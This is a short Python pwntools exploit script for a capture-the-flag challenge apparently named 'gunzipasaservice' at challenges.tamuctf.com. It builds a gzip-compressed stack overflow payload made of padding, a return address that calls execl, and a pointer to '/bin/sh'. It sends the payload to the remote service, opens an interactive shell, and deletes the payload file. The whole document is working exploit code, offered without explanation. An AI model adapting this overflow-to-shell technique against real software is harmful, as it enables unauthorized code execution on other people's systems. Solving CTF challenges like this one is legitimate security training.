from pwn import *
import gzip
import os

PAYLOAD_F = "./payload.gz"

def gen_payload(p_f):
    ret_offset = 0x418
    call_execl = 0x8049298
    binsh = 0x804a00e
    
    payload = b"A"*ret_offset
    payload += p32(call_execl)
    payload += p32(binsh)
    payload += p32(0x0)

    with gzip.open(p_f, mode='wb') as f:
        f.write(payload)

def run_shell(p_f):
    #r = process('./gunzipasaservice')
    r = remote("challenges.tamuctf.com", 4709)
    
    payload = None
    with open(p_f, mode='rb') as f:
        payload = f.read()
    
    r.sendline(payload)
    r.interactive()

def rm_payload(p_f):
    os.remove(p_f)

def main(p_f):
    gen_payload(p_f)
    run_shell(p_f)
    rm_payload(p_f)

if __name__ == '__main__':
    main(PAYLOAD_F)
